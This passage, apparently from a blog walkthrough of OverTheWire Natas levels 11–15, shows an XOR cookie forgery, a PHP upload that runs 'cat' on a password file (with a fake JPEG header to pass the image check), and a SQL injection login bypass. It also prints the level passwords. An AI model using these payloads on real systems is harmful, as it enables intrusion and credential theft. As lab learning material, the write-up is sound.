</span><span class='line'><span class="cp">&lt;?</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&quot;showpassword&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;yes&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;The password for natas12 is &lt;censored&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Well, looking at the page, we see a <em>data</em> cookie that&rsquo;s base64 encoded, but decoding it gives rubbish because it&rsquo;s XOR encrypted. The PHP code operates on it. We can also set the background color by giving it a valid value.</p>

<p>Now for the code! Breaking it down:</p>

<ul>
<li><p>The default data is an array comprised of the values <em>showpassword</em> set to no and <em>bgcolor</em> set to #ffffff</p></li>
<li><p>The xor_encrypt function performs XOR encryption on the given input</p></li>
<li><p>The loadData function loads the data from the cookie, or keeps the default values if the data is invalid.</p></li>
<li><p>The saveData function sets the cookie&rsquo;s value by the process of  <code>JSON encode &ndash;> XOR encrypt &ndash;> base64 encode</code></p></li>
</ul>


<p>At the end, we can see that if <em>showpassword</em> is set to yes, the password for the next level will be displayed. To achieve this, we have to mirror the cookie creation process, and change that value accordingly. But we don&rsquo;t have the key used for the XOR encryption. However, we know that in XOR encryption, <code>original xor key = encrypted</code>, and the following also applies: <code>original xor encrypted = key</code>. Because we have both the original data and the encrypted version, we can recover the key!</p>

<p>I kept the original code since it does all the work, and only made some modifications to the variables:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="c1">// the value of the cookie after base64 decoding</span>
</span><span class='line'><span class="nv">$original</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="s1">&#39;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&#39;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">xor_encrypt</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$defaultdata</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&quot;showpassword&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;no&quot;</span><span class="p">,</span> <span class="s2">&quot;bgcolor&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;#ffffff&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">// the json encoded version of the default data</span>
</span><span class='line'>    <span class="nv">$key</span> <span class="o">=</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$defaultdata</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$in</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Iterate through each character</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$outText</span> <span class="o">.=</span> <span class="nv">$text</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="nv">$outText</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="nx">xor_encrypt</span><span class="p">(</span><span class="nv">$original</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ran this through the PHP sandbox at <a href="http://sandbox.onlinephpfunctions.com/">http://sandbox.onlinephpfunctions.com/</a> and the result was the string <code>qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq</code>. The string <em>qw8J</em> gets repeated, this is the key! Now we can reuse the code to create a cookie encrypted with this key, and with <em>showpassword</em> set to yes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$defaultdata</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&quot;showpassword&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;yes&quot;</span><span class="p">,</span> <span class="s2">&quot;bgcolor&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;#ffffff&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$json_data</span> <span class="o">=</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$defaultdata</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">xor_encrypt</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;qw8J&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$in</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Iterate through each character</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$outText</span> <span class="o">.=</span> <span class="nv">$text</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$outText</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="nx">xor_encrypt</span><span class="p">(</span><span class="nv">$json_data</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Running this code gives a new cookie value: <code>ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK</code>. Replace the cookie value in the page and you will get the next password: <code>The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</code></p>

<h3>Level 12</h3>

<p><img class="center" src="/images/overthewire/natas/natas12.png" title="natas12" alt="natas 12"></p>

<p>For this mission it seems we can upload a file to the server.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">genRandomString</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$length</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$characters</span> <span class="o">=</span> <span class="s2">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$string</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$p</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$p</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nv">$string</span> <span class="o">.=</span> <span class="nv">$characters</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$characters</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">makeRandomPath</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">do</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$path</span> <span class="o">=</span> <span class="nv">$dir</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nx">genRandomString</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;.&quot;</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$path</span><span class="p">));</span>
</span><span class='line'>    <span class="k">return</span> <span class="nv">$path</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">makeRandomPathFromFilename</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="nv">$fn</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$fn</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="nx">makeRandomPath</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;filename&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$target_path</span> <span class="o">=</span> <span class="nx">makeRandomPathFromFilename</span><span class="p">(</span><span class="s2">&quot;upload&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;filename&quot;</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadedfile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">1000</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;File is too big&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadedfile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$target_path</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;The file &lt;a href=</span><span class="se">\&quot;</span><span class="si">$target_path</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="si">$target_path</span><span class="s2">&lt;/a&gt; has been uploaded&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span> <span class="k">else</span><span class="p">{</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;There was an error uploading the file, please try again!&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>The code tests if the file satisfies the constraints and uploads it with a new name that&rsquo;s randomly generated. Then it gives you the link where you can find it:</p>

<p><img class="center" src="/images/overthewire/natas/upload.png" title="upload" alt="upload"></p>

<p>So I tried uploading a PHP file that would read the password for the next level:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# cat pass.php 
</span><span class='line'>&lt;?
</span><span class='line'>echo(exec('cat /etc/natas_webpass/natas13'));
</span><span class='line'>?&gt;</span></code></pre></td></tr></table></div></figure>


<p>But the extension is changed to a jpg, so the code doesn&rsquo;t get executed. Further in the HTML there is this line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;filename&quot;</span> <span class="na">value=</span><span class="s">&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot;</span> <span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>I used Firebug to change the jpg extension to a php one and re-uploaded the file and this time it worked: <code>The file upload/g72k7zidu8.php has been uploaded</code>. Next I followed the link and inside was the password: <code>jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</code></p>

<h3>Level 13</h3>

<p><img class="center" src="/images/overthewire/natas/natas13.png" title="natas13" alt="natas 13"></p>

<p>Ok, this time they made a modification so that only jpg files can be uploaded..or so they claim. The code is the same as the last challenge, except for a new check:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nb">exif_imagetype</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadedfile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;File is not an image&quot;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p><strong>exif_imagetype()</strong> reads the first bytes of an image and checks its signature. If the signature is invalid, it returns False.</p>

<p>This type of check can be fooled by providing the specific magic number for the file in question. The signature for jpg files is the hex value 0xFFD8FFE0</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# echo -e '\xFF\xD8\xFF\xE0' &gt; pass.php
</span><span class='line'>root@kali:~/Desktop# echo "&lt;?echo(exec('cat /etc/natas_webpass/natas13'));?&gt;" &gt;&gt; pass.php </span></code></pre></td></tr></table></div></figure>


<p>The upload process is the same (don&rsquo;t forget to modify the extension with Firebug or other tools). Then I went to the link and the password is  <code>Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</code>. If you notice the weird looking characters  before it, it&rsquo;s because the text representation of the jpg magic number is also echoed back. The password starts after that</p>

<h3>Level 14</h3>

<p><img class="center" src="/images/overthewire/natas/natas14.png" title="natas14" alt="natas 14"></p>

<p>Looking at the code hints at what type of vulnerability can be exploited:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;natas14&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;censored&gt;&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">&#39;natas14&#39;</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * from users where username=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> and password=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;password&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;Executing query: </span><span class="si">$query</span><span class="s2">&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;Access denied!&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>No input sanitization = SQL injection! Moreover, we can get additional information by setting debug to True in the URL. For that, I also included the username and password fields in the URL: <a href="http://natas14.natas.labs.overthewire.org/index.php?debug=True&amp;username=test&amp;password=pass">http://natas14.natas.labs.overthewire.org/index.php?debug=True&amp;username=test&amp;password=pass</a></p>

<p>And now there was a message showing the query that was run on the backend:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> Executing query: SELECT * from users where username="test" and password="pass"
</span><span class='line'>Access denied!</span></code></pre></td></tr></table></div></figure>


<p>After seeing how the query looks like, I used the following injection string to fool the database:</p>

<p>username = can be anything</p>

<p>password = <code>pass" or 1=1&mdash; </code></p>

<p>To see why this works, look at the query now:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="n">Executing</span> <span class="n">query</span><span class="p">:</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="ss">&quot;test&quot;</span> <span class="k">and</span> <span class="n">password</span><span class="o">=</span><span class="ss">&quot;pass&quot;</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- &quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>By fixing the quotes we forced the database to evaluate an always true condition (1=1) and bypass the credentials check. The <code>&mdash; </code> comments out the rest of the query which would otherwise break our injection. If you inject in the URL, don&rsquo;t forget that you need to URL encode the space (%20)</p>

<p>After the SQL injection, you will see this: <code>Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</code></p>

<h3>Level 15</h3>

<p><img class="center" src="/images/overthewire/natas/natas15.png" title="natas15" alt="natas 15"></p>

<p>This time you can check if a username exists or not. Let&rsquo;s look at the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm">CREATE TABLE `users` (</span>
</span><span class='line'><span class="cm">  `username` varchar(64) DEFAULT NULL,</span>
</span><span class='line'><span class="cm">  `password` varchar(64) DEFAULT NULL</span>
</span><span class='line'><span class="cm">);</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;natas15&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;censored&gt;&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">&#39;natas15&#39;</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * from users where username=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;Executing query: </span><span class="si">$query</span><span class="s2">&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;This user exists.&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;This user doesn&#39;t exist.&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;Error in query.&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>We can again see the query that is being run on the backend by manipulating the URL: <a href="http://natas15.natas.labs.overthewire.org/index.php?debug=True&amp;username=natas16">http://natas15.natas.labs.overthewire.org/index.php?debug=True&amp;username=natas16</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Executing query: SELECT * from users where username="natas16"
</span><span class='line'>This user exists.</span></code></pre></td></tr></table></div></figure>


